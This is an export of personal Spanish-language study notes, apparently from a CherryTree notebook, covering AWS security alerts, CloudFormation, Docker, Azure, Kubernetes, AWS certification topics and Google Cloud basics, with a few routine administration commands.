   → es un servicio completamente administrado
   → se encuentra para proteger datos de amazon s3
   → lectura y escritura de S3 (manejo de alertas)
   → credenciales de acces
   → cambios de configuracion que puedan afectar a un servicio
   → detecta software peligroso
   → accesos a recursos desde IP o sistemas sospechosos
   → identificacion de intentos de un usuario/role para obtener privilegios elevados
   → anonymous, alguien quiere acceder a los datos y trata de hacerse pasar por alguien mas
   → permisos, identifica los permisos de los datos y las politicas
   → perdida de datos riesgos de anomalías de acceso a data importante
   → credentials, credenciales cargadas en S3
   → location, intentos de acceso desde lugares desconocidos
   → hosting, almacenamiento de software riesgoso o malintencionado
</rich_text>
    </node>
    <node name="Infra as code" unique_id="20" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625506996" ts_lastsave="1625605027">
      <rich_text># Intro
- herramientas
   → hay varias, cloudformation sera el fundamental
- servicios en cloud
   → variados
- se puede tener versionamiento
- se puede tener control y trazbilidad de quien hace los cambios
- se puede tener un set de servicios a desplegar
- se puede hacer por medio de un template
   → se tiene estandarizado
   → se puede automatizar
- es reutilizable
- infraestructura inmutable, es muy normal en Infra as code
- Herramientas:
   → Terraform:
      ⇒ multicloud
      ⇒ es open source y enterprise
   → Pulumi:
      ⇒ se puede usar un lenguaje de programacion para el despliegue
   → serverless framework
      ⇒ especializado en arquitecturas serverless
      ⇒ no se puede hacer otro tipo de infra
   → SDK
      ⇒ es la forma nativa que da el cloud
      ⇒ es el boto3 por medio de lenguaje de programacion
   → CDK
      ⇒ cloud development kit
      ⇒ se despliega con lenguajes de programacion
      ⇒ se llaman los mismo servicios
   → AWS SAM
      ⇒ aplicaciones serverless pero es de AWS
- Cloud formation:
   → flujo de despliegue
   → codigo, verificion y despliegue
   → se pueden crear los templates en JSON o YAML
   → servicios:
      ⇒ Stacks
      ⇒ Stacks set
      ⇒ Designer
   → Integracion completa con AWS
   → aws da soporte sobre el codigo
   → los nuevos servicios son accesibles
   → Se pueden crear arquitecturas de forma gráfica
   → Multi cuenta, se pueden hacer varios despliegues
   → es flexible, crear recursos dinamicos
   → es gratis
   → con una plantilla se puede desplegar varios servidores
   → todos los despliegues son cifrados
   → estable, maneja algo sslas
   → espera a los recursos por crearse

# Que es un stack y como funcionan
- Es una colección de recursos que se manejan como una unidad
- CF asegura que todos los recursos sean creados, si en dado caso falla alguno se borran todos
- se hace rollback si falla el recurso, puede que no los elimine si uno asi lo requiere
- al borrar un stack se borra todo
- Drift:
   → detecta desviación de lo que se desplego con lo que esta en la consola
   → no se debe de hacer, se debe hacer todo desde los stacks

# Stack sets:
- existen cuentas administrador y cuentas target
- se deben de hacer desde cuenta maestra
- se hace referencia a un stack dentro de una cuenta
- se pueden desplegar con diferentes parametros
- se puede actualizar desde la cuenta maestra
- solo cambia para el stack que se requiera
- se puede borrar desde la cuenta maestra
- se pueden usar diferentes tipos de roles, por eso se crea con una maestra
- generalmente se usan para despligues de alto rendimiento

# Nested stacks
- stacks en otros stacks
- limites de cloudformation
   → 100 mappins
   → 200 recursos
   → 51,200 bytes, cuerpo del template
   → 460,800 bytes tamaño maxico de template S3
- granularidad:
   → cada recurso queda con un stack independiente
- se mantiene un orden
- se puede tener interacción entre si a través de outputs

# Funciones intrínsecas
- GetAtt:
   → trae el valor de un atributo
   → se compone del nombre del recurso y del nombre del atributo
   → se tienen tres formatos, y dependera de si se esta usando yaml o json
   → se usa cuando se tiene un stack, se tienen dos recursos y un recurso depende de otro recurso
   → se referencia un recurso de otro recurso
- FindInMap:
   → Devuelve el valor correspondiente al map declarado en la sección Mappings
   → composicion: MapName, TopLevelKey y SecondLevelKey
   → se tienen tres formatos e igual depende de que se use
   → se usa cuando un Mapping tiene un valor que se requiere llamar
   → nombre del mapping, referencia al valor y se obtiene el valor interno
- Join
   → une valores diferentes en uno solo
   → usa un listado de valores
   → igual se tienen 3 tipos de formatos
   → un delimitador y una lista de valores
- Split:
   → divide una cadena de valores en valores independientes
   → se tiene 3 sintaxis
   → se usan cuando se tienen unos valores que estan unidos por un delimitador y que se requiere uno
   → se usa teniendo el delimitador y el valor que se quiere dividir
- Select:
   → se toma un valor dividio en split
   → se tiene 3 sintaxis
   → se usa el indice que se quiere (empezando en 0) y toma el argumento dividido
- Sub
   → sustituye valores por un valor especificado
   → se tiene el nombre de la variable y el valor que se quiere poner por ese valor
   → se pueden usar como si fueran variables de entorno ${variable}
- Ref
   → retorna un valor de un parámetro o un recurso
   → string varname: valuename
   → se usa cuando se necesita hacer referencia a un parametro
   → cuando se quiere hacer referencia a una propiedad de un recurso que no soporte GetAtt
   → generalmente se usa con Parameters
- ImportValue
   → devuelve el valor de una salida exportada de otro stack
   → referencia al nombre lógico del recurso exportado
- if
   → retorna un valor si la condicion se cumple y otro si no (es un if ternario)
- OR
   → regrese true si alguno de los valores es verdadero
- AND
   → solo regresa true si todo se cumple
- EQUALS:
   → compara dos valores, si son iguales hace una acción en especifico
~~~ Las condiciones logicas dependen de como se use el template

# Automatizar
- Agilidad, despliegues cortos
- control, integridad en la infraestructura
- seguridad, Pipelines seguros sin exponer datos
- Usabilidad reutilización de componentes
- manejo de errores, trazabilidad en todos los despliegues
- rollback, automático ante errores
- Servicios:
   → codecommit
      ⇒ parecido a github, el repo de aws
   → cloudformation
      ⇒ la infraestructura como codigo
   → Codepipeline:
      ⇒ Orqueta servicios del despliegue
   → Codebuild:
      ⇒ Compilacion y creación de artefactos
   → se puede usar repos github
   → IAM
      ⇒ manejo de roles en el pipeline
   → cloudwatch
      ⇒ moniitoreo de despliegues
   → S3
      ⇒ almacenamiento de artefactos
   → secrets manager:
      ⇒ gestion de secretos
   → KMS
      ⇒ Llaves de seguridad en el pipeline

# Seguridad
- informacion sensible
   → cadenas de conexion
   → token de github
   → todo aquello que se debe de proteger
- Integracion:
   → integrar diferentes tipos de seguridad
- secrets manager:
   → maneja secretos
   → manejo de datos como claves, credenciales de aws, claves y otros secretos
- Parameter stores:
   → maneja llaves y claves seguras
- uso de buckets cifrados
- tokens de repositorios para haer la integracion

# Errores:
¿Cómo se llama a dividir los stacks por recursos y orquestarlos desde un stack maestro?
¿Cuál servicio en AWS dentro de un pipeline podemos utilizar para crear el artefacto que desplegaremos en Cloudformation?
El estado UPDATE_COMPLETE a qué hace referencia? 
¿Cuál propiedad es obligatoria al desplegar una función lambda como AWS::Lambda::Function?
En la creación de un ROLE en Cloudformation, ¿qué opción debe ser habilitada en Cloudformation?
¿Cuál función utilizarías para obtener un true si alguno de los valores es falso en un arreglo?
</rich_text>
    </node>
    <node name="docker" unique_id="21" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1626358714" ts_lastsave="1627941892">
      <rich_text># Problemas del desarrollo del software en general:
- Construir:
   → solo es una pequeña parte
   → los problemas complejos necesitan equipo
   → entorno de desarrollo
   → dependencias
   → entorno de ejecución
   → equivalencia con entorno productivo
   → servicios externos
- Distribuir:
   → tiene que transformarse en un artefacto, que se transportan donde se deben ejecutar
   → son por ejemplo exe, apk, jars y demas
   → divergencia de repositorios
   → divergencia de artefactos
   → versionado
- Ejecutar:
   → la maquina donde se escribe es diferente a la maquina que se ejecuta
   → compatibilidad con el entorno productivo
   → dependencias
   → disponibilidad de servicios externos
   → recursos de hardware
- docker permite construir, distribuir y ejecutar cualquier app

# Virtualización:
- forma de solucionar algunos problemas
- versión virtual de algún recurso
- permite atacar en simultaneo los tres problemas del software
- crear maquinas (por software) en otra maquinas (fisicas)
- problemas:
   → peso, en el orden de los GB, repiten archivos, inicio lento
   → costo de administración, necesita mantenimiento igual que cualquier otra maquina
   → multiples formatos: VDI, VMDK, VHD, raw y otros
- docker alterna la virtualizacion. con contenedores
- los contenedores tienen un tamaño por default preestablecido
- ventajas:
   → son flexibles
   → livianos
   → portables
   → bajo acoplamiento
   → escalables
   → seguros
   → se usa el kernel de la maquina donde se esta ejecutando

# Que se instala y que se hace:
- permite contruir, ejecutar y compartir contenedores
- es:
   → server (docker deamon)
   → Rest API
   → Client docker CLI
   → network:
      ⇒ las redes que permite a los contenedores comunicarse
   → container:
      ⇒ es la base de todo docker
      ⇒ aqui corren las apps
   → image
      ⇒ artefactos para empaquetar contenedores
   → data volumes
      ⇒ permisos para acceder con seguridad al sistema de archivos
      ⇒ no compromete la seguridad

# Primeros pasos
- un contenedor es una maquina virtual liviana
- uno o mas procesos que corren nativamente de la maquina pero estan aislados
- esta limitado a que puede ver o acceder
- inspect sirve para poder ver como estan los dockers (por nombre)
- se puede renombrar con docker rename . .
- para borrar se usa docker rm
- docker run -it {maquina}, para acceder
- se puede tener prendido asi: docker run -d ubuntu tail -f /dev/null
- el process id dentro del contenedor siempre tendra como 1 el que se manda, fuera de docker es otro process id
- puertos:
   → 8080(local):80(contenedor)

# Datos en docker
- no se puede acceder a la maquina a menos que se les permita
- no se sabe que esta dentro de otra maquina
- con -v se especifica un bind mount: -v {ruta de la maquina}:{ruta del contenedor}
- volumenes:
   → es lo mas estandar
   → es una evolucion de los bind mounts
   → para crear un volumen: docker run -d --name db --mount src=dbdata,dst=/data/db mongo
   → estos son mount creados con docker volume create
- para copiar archivos: docker cp prueba.txt copy_test:/testing/., no es necesario que el contenedor este corriendo

# Imagenes:
- como docker como soluciona la construccion y distribucion del codigo
- docker gana eficiencia haciendo capas
- una imagen es la plantilla para correr nuevos contenedores
- conjunto de capas, una va detras de la otra y estan ordenadas

# Uso
- se recomiendas mas el uso de CMD ["app", “command”] aunque tambien se puede usar CMD app command
- cada que se construye una nueva app se puede usar el layer cache
   → si la tiene ya construida y docker la encuentra ya no la vuelve a crear
   → para aprovechar mejor su uso, lo mejor es copiar primero los archivos de dependencias y luego el codigo
   → uso de volumenes para no hacer el build cada que cambia algo
- en redes la red de tipo host sirve para usar la red real de mi maquina
- none es para que no acceda de ninguna forma a la red
- docker network create --attachable platzinet, el comando en -- es para que se pueda conectar cualquiera
- docker network connect platzinet db, connect contenedores a la red

# Docker-compose
- El docker compose es una herramienta que nos permite describir de forma declarativa la arquitectura de nuestra app.
- compose override para hacer cambios al compose sin estar cambiando el archivo

# Administración
- revisar alternativas para docker desktop y revisar configuraciones
- envia señar systerm si no termina envia syskill
- docker ps -l, para mostrar el ultimo ps del proceso, si es mayor a 128 quiere decir que se forzo... 128 + 9 = 137, por lo tanto salio forzado
- se puede usar docker kill {nombre}
- docker exec looper ps -ef, muestra los procesos sin entrar el docker
- si se usa ["{programa}"] es exec form, sin corchetes es shell form, si se corre como shell se corre como programa hijo de shell
- de preferencia usar exec form
- CMD o ENTRYPOINT: usando el docker como binario
   → CMD: es el comando que se ejecutara o las opciones que se mandan
   → ENTRYPOINT: es el comando por defecto que se corra siempre
- el contexto del build, monta en un filesystem temporal todos los archivos donde se haran los copies
- con dos front lo que se hace, es definir las fases en un build, nos ayuda que de una fase posterior podemos acceder a una fase anterior
- docker en docker:
   → se habla a docker por un socket
   → montar socket a un docker
   → docker run -it --rm -v /var/run/docker.sock:/var/run/docker.sock docker:19.03.12
   → suena a manejo de administracion por medio de dockers usando el otro docker



Uso de .dockerignore:
¿Qué es Docker Cloud?
¿Qué es Docker Machine?

</rich_text>
    </node>
    <node name="Azure" unique_id="22" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1628261625" ts_lastsave="1632417701">
      <rich_text># Aprenidiendo sobre la nube
- abstraccion de muchas cosas
- que no es:
   → no son satelites con internet
- lo que si es:
   → son instalaciones de equipos de computo
   → seguridad, electricidad independiente
   → se les conoce como data centers
   → no es publica, solo ingresan las personas con ciertos permisos
   → estan distribuidos a lo largo del mundo
- curiosidades:
   → es la que tiene mas datacenters tiene
   → se busca que sean 100% sustentables
   → busqueda de llevarlos al oceano
   → centros de datos en regiones costeras
- se dedica a brindar servicios:
   → computo
   → servidores
   → redes
   → IA
   → almacenamiento
   → software y mas
- todo lo que se hace en una computadora en el provedor y muchas mas barato, agil y seguro
- se maneja a traves de servicios, no se requiere de tener infraestructura
- se escala segun la necesidad
- gastos de capital (CapEx) inversion en infraestructura fisica, deducible a largo plazo
- gastos operativos (OpEx), invecrsion en servicios o productos facturados al momento
- confiabilidad y alta disponibilidad:
   → se encarga de que no se noten los errores de forma perseptible
- es escalable:
   → vertical, en un solo equipo
   → horizontal, aumento de instancias requeridas
- elastica:
   → las apps siempre tendran los recursos necesarios
- agil:
   → es muy rapida la implementación
- distribucion geografica:
   → se asegura que este disponible para todo el mundo
- recuperacion ante desastres:
   → datos protegidos por desastres de la naturaleza
- Modelos de servicios:
   → local, depende al 100 de nosotros
   → infraestructura como servicio, administración del cliente, solo la parte virtual del equipo
   → plataforma como servicio, administración del provedor, solo te preocupas por el almacenamiento y las apps
   → software como servicio, SaaS, 100% al provedor
- Tipos de nubes:
   → publica
      ⇒ accesible a tod el mundo
      ⇒ son propiedad de un provedor
      ⇒ se distribuye a traves de internet
   → privada
      ⇒ accesible para ciertos miembros de la organizacion
      ⇒ puede ser on-premise u hospedada
   → hibrida
      ⇒ es una combinacion de ambas
      ⇒ generalmente son on-premise con nube publica

# Componentes de Azure
- mas de 100 servicios distintos para la nube
   → procesos
   → seguridad
   → servidores
   → redes
   → devops
   → desarrollo de apps
   → hartas cosas
- ventajas:
   → preparado para el futuro
   → crea a tu ritmo
   → listo para cualquier tipo de nube
   → confiable
- como funciona:
   → a traves de virtualizacion
- se organizan por fabric controller
- tiene un orquestador
- api: azure portal, azure CLI
- market place, desarrollos de terceros
- cuentas:
   → administrador
      ⇒ administran el acceso, las directivas y el cumplimiento de las subcipciones
   → suscripciones
      ⇒ agrupacion de cuentas de usuario y recursos creados por estas cuentas, se pueden tener limites o cuotas
   → grupo de recursos
      ⇒ se pueden agrupar en contenedores logicos
      ⇒ implementacion y administracion, por ej. aplicaciones web
      ⇒ si un recurso existe en un grupo solo se puede usar en ese grupo, pero se pueden comunicar con otros
   → recursos
      ⇒ instancias de los servicios disponibles
         • discos duros
         • FaaS
         • Bases de datos
- Tipos de suscripcion:
   → desarrollador
   → prueba
   → suscripcion
   → estudiante
- limites:
   → facturacion:
      ⇒ cada una es diferente
   → control de accesos:
      ⇒ algunas acciones no se pueden hacer
- se ocupan mas suscripciones cuando:
   → se necesitan separar los espacios de trabajo
   → desarrollo
   → pruebas
   → aislamiento de datos
   → depende tambien de la estructura organizacional
   → separados segun la facturacion
   → se pueden definir por el hardware, poniendo limites a los accesos de red, discos o computadoras
- grupos de administracion
   → se puede tener una jerarquia
   → se tendran accesos a solo ciertos espacios de trabajo
   → se pueden tener 10000 grupos de administracion por directorio
   → y es un arbol de hasta 6 niveles
   → cada grupo solo puede tener un grupo primario
   → pero puede tener muchos grupos secundarios
- recurso es un elemento administrable en azure
   → todos los recursos pertenecen a un grupo de recursos
   → solo puede pertenecer a un solo grupo de recursos
   → se pueden mover entre los grupos
   → no se pueden anidar grupos de recursos
   → facilita la administracion y organizacion
   → tienen un sistema de autorizacion, basado en roles
   → azure resource manager
      ⇒ se puede comunicar de varias formas, ARM, sdk, cliente rest, azure-cli, powershell o portal
      ⇒ plantillas en JSON
      ⇒ administrar grupos de recursos o recursos
      ⇒ capacidad de reutilizacion
      ⇒ Etiquetas
      ⇒ facturacion, se puede tener por etiquetado
- grupo e sla agrupacion de recursos en contenedores logicos
   → cuando se elimina se le eliminan todos los recursos que tenga dentro
- Regiones y zonas de disponiblidad:
   → las regiones son las areas geograficas donde tendremos al menos un datacenter
   → las regiones tiene ciertas herramientas que en otras no
   → hay regiones especiales que son para el uso del gobierno
   → azure tiene el mayor numero de regiones a nivel global
   → las zonas de disponibilidad, es donde hay mas de dos datacenters en una misma region, son los respaldos
   → no todas las regiones tiene zonas de disponibilidad
   → pares de regiones, son regiones que tienen por lo menos 500km de distancia para replicar ciertos recursos

# Servicios de azure
- se tiene dos tipos de bases de datos (aqui se tienen laboratorios de bases de datos, clase 11):
   → SQL:
      ⇒ Azure sql database, es un sql server es compatible con NoSQL, es un PaaS
      ⇒ Managed instance
         • comando para backup
         • common language runtime
         • transacciones entre bases de datos
         • no cuenta con escalado automático
         • nos permite migrar a la nube
      ⇒ se tiene otros servicios como:
         • mysql community, 5.6, 5.7 y 8.0
         • Postgresql
   → NoSQL:
      ⇒ azure cosmos db, es serverless es independiente al rendimiento y almacenamiento, es flexible y guarda en ARS (se abstraen y se proyectan como un API), es compatible con otros motores de datos
   → Tiene tipos de datos:
      ⇒ estructurados
      ⇒ no estructurados
      ⇒ semiestructurados
   → Servicios de analisis y big data
      ⇒ Azure synapse analytics
         • datos sin procesar, refinados o seleccionados
         • compatible con sql y spark
      ⇒ Azure hdinsight
         • se pueden crear con cluster tipo, spark, hadoop, kafka, Hbase y mas
         • admite etl
      ⇒ Azure Databricks
         • descubre informacion en volumenes muy grandes
         • compatible con apache spark
      ⇒ Azure data lake analytics
         • realiza análisis bajo demand
         • enfocado a etl
         • modelo pay as you go
- Servicios de computo
   → Azure virtual machine
      ⇒ IaaS
      ⇒ buenas para pruebas y desarrollo, ejecutar apps en la nube, extender recursos en la nube, recuperacion ante desastres
      ⇒ Migración (lift-and-shift) on-premise to cloud
   → Azure batch
      ⇒ conjunto de vms
      ⇒ configuracion rapida
      ⇒ aumento o disminución automático
   → Azure container instances
      ⇒ un maquina virtual mas liviana
      ⇒ solo se virtualizan ciertas cosas del SO
      ⇒ espacio aislados
      ⇒ PaaS
      ⇒ es sencillo
      ⇒ permite cargar contenedores
   → Azure kubernetes services
      ⇒ Orquestacion de contenedores en volumen
   → Azure app services:
      ⇒ permite crear y alojar aplicaciones conectadas a la web
      ⇒ compatible con linux y windows
      ⇒ permite web, app, segundo plano y moviles
   → Azure functions (serverless)
      ⇒ sin servidor
      ⇒ control por evento
      ⇒ pago por uso
   → Azure logic apps
      ⇒ flujos de trabajo basado en eeventos
      ⇒ se pueden crear de forma visual o en json
      ⇒ cuenta con mas de 200 conectores y bloques
      ⇒ los conectores tienen diferentes precios
- Servicios de almacenamiento:
   → Azure blob storage
      ⇒ binary large object
      ⇒ almacenamiento no estructurado
      ⇒ miles de cargas simultaneas
      ⇒ sin restricciones
      ⇒ sirve para imagenes, videos
      ⇒ acceso distribuido
      ⇒ streaming
      ⇒ backup
      ⇒ analisis de datos
      ⇒ almacenamiento de VMs &gt; 8TB
      ⇒ tiene niveles de acceso:
         • frecuente
         • esporadico (30 dias): reportes
         • archivo (180), copias de seguridad
   → Azure Files:
      ⇒ permite almacenar archivos
      ⇒ archivos administrados en SMB o NFS
      ⇒ pueden estar local o en la nube
- Servicios de red
   → Azure virtual network
      ⇒ permite a los recursos comunicarse entre si
      ⇒ se puede tener aislamiento y segmentación
      ⇒ comunicacion con internet
      ⇒ comunicacion entre recursos
         • redes virtuales
         • puntos de conexion
      ⇒ comunicacion con recursos locales
         • redes virtuales de punto a sitio
         • redes privadas (VPN)
         • azure expressroute
      ⇒ enrutamiento de trafico
         • tablas de ruta
         • protocolo de puerta de enolace de borde (BGP)
      ⇒ Filtrado del trafico de red
         • grupos de seguridad
         • aplicaciones virtuales de red
   → Azure VPN GAteway
      ⇒ conecta redes locales a azure via VPN de sitio a sitio
      ⇒ se usan protocolos IPsec e IKE
   → Azure ExpressRoute
      ⇒ genera conexiones privadas entre azure y la infraestructura, sin utilizar internet público
      ⇒ solo 10 conexiones a la vez
- Servicios de inteligencia artificial
   → Azure machine learning:
      ⇒ PaaS para realizar predicciones conectandose a datos para entrenar datos
      ⇒ ofrece control completo del diseño y entrenamiento de algoritmos
   → Azure cognitive services
      ⇒ modelos de ML que permiten ver, oir, hablar, entender y pensar
      ⇒ no se necesitan conocimientos de ML o DS
   → Azure bot service
      ⇒ permite crear bots o agentes virtuales
      ⇒ bot framework
- Servicios de devops
   → Devops services
      ⇒ azure repos, codigo fuente estilo github, estan en la misma nube y uso de la organización
      ⇒ azure boards, tableros para la gestion de proyectos y tareas un jira
      ⇒ azure pipelines, herramienta de automatizacion CI/CD
      ⇒ Azure artifacts, repositorios para guardar artefactos
      ⇒ azure test plans, herramientas de pruebas automatizadas para garantizar la calidad
      ⇒ Github &amp; github actions
   → Azure devtest labs
      ⇒ automatizado de administrar proceso de compilacion, configuracion y anulacion de VMs y otros recursos
- Servicios de supervisión y monitoreo
   → Azure advisor
      ⇒ evalua recursos
      ⇒ hace recomendacion para mejorar
      ⇒ se hace atraves de api o del portal
      ⇒ confiabilidad
      ⇒ seguridad
      ⇒ rendimiento
      ⇒ costos
      ⇒ excelencia operativa
   → Azure monitor
      ⇒ informacion de manera general
      ⇒ recopila analiza y muestra datos para tomar acciones basadas en metricas
   → Azure service health
      ⇒ brinda vista personalizada del estado de los servicios, regiones y recursos de azure
      ⇒ problemas de servicio
      ⇒ mantenimientos planeados
      ⇒ avisos de estado
- Herramientas para administracion y control
   → Visuales
      ⇒ Azure portal
      ⇒ Azure mobile app
         • compatible con iOS y Android
         • supervisa estado de azure
         • alertas, diagnosticos y correcciones
         • se peude ejecutar comando con powershell o bash
   → basadas en codigo
      ⇒ Azure powershell
      ⇒ Azure cli - para sistemas diferentes de windows
      ⇒ Azure resource manager
         • formato json
         • se comprueban antes de ejecutar
         • se define el estado y configuracion de cada recurso
- Serverless
   → azure functions
      ⇒ tiene porciones de codigo
      ⇒ se basa en eventos
         • solicitudes http
         • temporizadores
         • mensajes
         • acciones
      ⇒ tiene escalado automatico
      ⇒ pago por funcion ejecutada
      ⇒ con o sin estado
      ⇒ tareas de orquestacion
      ⇒ compatible con C#, python, ts, js, shell, java, F#
   → Azure logic apps
      ⇒ no-code, low-code
      ⇒ ideal para automatizar y organizar
      ⇒ integracion con aplicaciones
- IoT
   → red de objetos fisicos con sensores y software, con el fin de conectar e intercambiar datos con otros dispositivos a traves de internet
   → Azure IoT hub
      ⇒ conecta los dispositivos con la nube
      ⇒ controlar las apps de forma manual o automatica
      ⇒ se puede supervisar
   → Azure IoT Central
      ⇒ esta basado en hub pero con interfaz virtual
      ⇒ posee plantillas para escenarios comunes
   → Azure Sphere
      ⇒ unidad de microcontrolador
      ⇒ sistema operativo
      ⇒ servicio de seguridad (AS3)
- Servicios de seguridad administrativa
   → Azure security center
      ⇒ brinda visibilidad del nivel de los servicios de la nube y local
      ⇒ supervisa la configuracion de seguridad
      ⇒ aplica cambios automaticamente
      ⇒ brinda recomendaciones
      ⇒ detecta y bloquea amenazas
      ⇒ detecta ataques e investiga amenazas
      ⇒ proporciona control just in time
      ⇒ notifica el estado actual
      ⇒ mejora el nivel
      ⇒ comparacion con puntos de referencia
   → Azure sentinel
      ⇒ recopila datos en volumen
      ⇒ detecta amenazas
      ⇒ investiga con IA
      ⇒ responde a incidentes
   → Azure key vault
      ⇒ administrar secretos o datos confidenciales
   → Azure dedicated host
      ⇒ servidores fisico que no se comparten con nadie mas
      ⇒ tienen mayor coste
   → Seguridad en la red
      ⇒ azure firewall
      ⇒ azure DDos protection
      ⇒ combinacion de servicios
   → servicios de identidad
      ⇒ autenticacion
         • solicitar credenciales legitimas a una persona
      ⇒ autorizacion
         • establece el nivel de acceso
   → Azure active directory
      ⇒ a que se accede y que permisos
   → Multi factor authentication
      ⇒ se le pide un codigo mas aparte de las credenciales
   → Inicio de sesion unico

# Privacidad, cumplimiento y proteccion de los datos
- para microsoft: “los datos de nuestros clientes NO son nuestros datos”
- cumplimiento
   → cumplir con una ley, estandar, conjunto de directrices, normas o requerimientos
- Declaración de privacidad
   → explica que datos personales recopila de nosotros y como los usa
- Terminos de los servicios en linea
   → contrato legal entre microsoft y el cliente
   → detalla obligaciones de ambas partes respecto al procesamiento y seguridad de los datos
- Anexo de proteccion de datos
   → terminos de seguridad y procesamiento de los datos en linea

# Manejo de costos
- Calculadora de costo total de propiedad:
   → costo de azure vs local
   → definir cargas de trabajo
   → ajustar presupuestos
   → consultar informe
- opciones para comprar:
   → contratos enterprise
   → en la web
   → provedor de soluciones (partners)
- Acuerdo de nivel de servicio
   → contrato formal entre empresa de servicios y cliente
   → define estandares
   → que incluyen
      ⇒ introduccion
      ⇒ terminos generales
      ⇒ detalles de SLA
   → entender:
      ⇒ garantias de servicios
      ⇒ hacerlas efectivas
      ⇒ disponibilidades
- Ciclos de vida
   → desarrollo
   → preliminar
   → disponibilidad general
   → desansejado

culture
automatizion
measure
sharing

CT - continues testing
CM - continues monitring

modelos de madurez
- cultura
- procesos
- tecnologia</rich_text>
    </node>
    <node name="kubernetes" unique_id="23" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1629332219" ts_lastsave="1629332243">
      <rich_text>para crear y acceder a un pod

kubectl run nginx --image=nginx:alpine --port=80
kubectl port-forward nginx 7000:80</rich_text>
    </node>
    <node name="AWS Certified Developer - Associate" unique_id="24" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1629731276" ts_lastsave="1629737116">
      <rich_text># What to expect
- examen de opcion multiple
- es de 65 preguntas
- cuando son multiples respuestas a contestar, se deben acertar todas las respuestas
- para presentarlo no se pueden tener pantallas extras, el mic abierto y con camara

# Deployment 22%
# Security 26%
# Development with AWS 30%
# Refactoring 10%
# Monitoring and Troubleshooting 12%


lectura de dynamo pueden ser:
- eventualmente consistentes a la mitad
- fuertemenete consistentes el total
- en excritura cada una siemrpe usa una unidad aun siendo menos de 1KB
- se pueden usar streams, para ciertsa operaciones, dondelas lambdas pueden procesar esa data</rich_text>
    </node>
    <node name="azure IaaS" unique_id="25" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1630695860" ts_lastsave="1640726561">
      <rich_text># Manejando la nube de azure

- Se divide en IaaS y en PaaS
   → IaaS
      ⇒ son maquinas virtuales que ofrecen el servicio
      ⇒ son mas caros, solidos y personalizables
   → PaaS
      ⇒ no se lidia con configuracion del servidor
   → depende mucho de la experiencia
   → arquitectura propuesta
      ⇒ por medio de dibujos que se va a hacer
      ⇒ saber que es capaz de hacer el sistema
- Como se elige una maquina virtual:
   → par que la voy a usar?
   → cuanto tiempo estara encendida?
   → se trata de una aplicacion de investigacion o productiva
   → cual sera el retorno de la inversion de mi MV
   → los requisitos principales pueden cambiar dependiendo de lo que se necesita
   → los tamanios se pueden especificar
   → existen 11 niveles de maquinas, las m de memory, son de las mas grandes
   → de preferencia aprendiendo se recomienda prender y apagar mientras se aprende
   → en productivo ya debe de estar prendida y deberiamos de tener 2 una de prod y otra para pruebas
   → se manejan dos tipos de sistemas operativos, windows (server y desktop) y linux
- Costos:
   → uso de calculadora para estimacion de costos
   → la region si influye
   → el tipo de discos
- todas las herramientas son hechas con python
- az vm list|create  --- para maquinas virtuales
- az vm extension --- para ejecutar scripts
- la modificacion del tama;o se hace desde Size</rich_text>
    </node>
    <node name="GCP" unique_id="54" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="#3465a4" ts_creation="1636378908" ts_lastsave="1637615494">
      <rich_text># Computo en la nube
- computo bajo demanda y auto servicio
- conectado a la red
- economias de escala
- elasticidad, cuando se require que los recursos cambien rapidamente
- servicio medido
- * es una computadora enorme de escala mundial

# Esquema del datacenter
- 22 regiones, 67 zonas, 140 puntos y 96 CDN
- estan cerca de cuerpos de agua, se usa como enfriamiento
- con energia renovable para los datacenter, no todos estan al 100% con energia renovable
- PMDC - centros de distribucion de energia
- se unen por fibra optica
- networking room - se conectan la red y cluster de Jupyter, se distribuye cada una de las solicitudes
- Jupyter network equipment - se absorven la mayor cantidad de datos, conecta todos los data center a la red global de G
- LOAD BALANCER, PARA DISTRIBUIR LA CARGA de los servicios de google
- water pipes, el agua que se usa para enfriar las computadoras
- Hot hut, espacio para mover el aire caliente
- cooling plant, mueve toda el agua caliente y obtiene nueva agua fria

# Eras del computo
- maquinas virtuales
- infraestructura en la nube
- nube transformacional

# Arquitecturas en GCP
- Maquinas virtuales
- GKE, aplicaciones computarizadas (google, kubernetes engine)
- app engine, cero administacion de servidores
- cloud run, contenedores serverless
- cloud functions, funciones serverless
- firebase, PaaS de front-end y desarrollo movil

# La red de google
- basado en topologia de capas
- jupiter data, dentro del data center
- b4 backbone, datacenter to datacenter
- b2 backbone, google to internet
- espresso, SDN peering edge
- Global VPC
- Global cloud load balancing
- DNS de baja latencia
- Content delivery networks
- vpc service controls
- network monitoring
- defensa contra DDoS y los ataques web

# Regiones y zonas
- una region es donde se tienen varias zonas
- cada zona es donde vive cada un datacenter

# API abiertas
- Multi cloud patterns
   → generacion de deployments complejos, en diferentes nubes
- Anthos
   → permite crear y administrar aplicaciones modernas

# Beneficios de google cloud
- Nube inteligente
- abierta y flexible
- colaboracion y productividad
- segura
- sustentable
- ahorrar costos
- facil de usar
- soluciones de industria

# Seguridad de varias capas
- on premise de nosotros depende completamente la seguridad
- IaaS, el provedor le toca el hardware y su conectividad
- PaaS, toda la seguridad de usuario, accesos y autorizaciones
- SaaS, el usuario solo se responsabiliza de las politicas de acceso y el contenido
- usar imagenes bases seguras, usar escaneadores de seguridad, autorizacion binaria (para solo correr en la infraestructura), shielded container, sandbox de contenedores, container threat detection

# Proteccion de los datos
- se guarda la informacion en diferentes discos duros, particionada y cifrada
- las llaves se cifran con otra llave

# Presupuesto y facturacion
- las billing accounts son el vehiculo de pago para los gastos de GCP
- billing acount
- payments profiles, metodos de pago
- tipos de convenios:
   → self serve, no se require de contrato para usar GCP
   → existen otros contratos con GCP donde ellos mandan una factura y ya se paga
- se recomienda tener un solo billing account por organizacion
